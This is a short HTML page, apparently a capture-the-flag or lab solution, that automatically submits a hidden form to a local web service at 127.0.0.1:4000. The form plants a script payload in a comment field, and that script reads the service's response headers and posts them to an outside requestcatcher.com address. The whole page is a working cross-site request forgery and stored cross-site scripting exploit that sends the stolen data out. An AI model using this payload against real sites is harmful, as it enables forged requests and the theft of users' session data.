<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>TEST</title>
</head>
<body>
  <h1>test</h1>
  <script>
    (()=>{
      const f = document.createElement('form');
      f.method = 'POST';
      f.action = 'http://127.0.0.1:4000/';
      const i = document.createElement('input');
      i.type = 'hidden';
      i.name = 'comment';
      i.value = `<script>
fetch("http://127.0.0.1:4000/")
  .then(r => {
    let headers = "";
    for (const [k, v] of r.headers.entries()) {
      headers += k + ": " + v + "\\n";
    }
    return fetch("https://singetu0096.requestcatcher.com/", {
      method: "POST",
      mode: "no-cors",
      body: headers
    });
  });
<\/script>`;
      f.appendChild(i);
      document.body.appendChild(f);
      f.submit();
    })();
  </script>
</body>
</html>
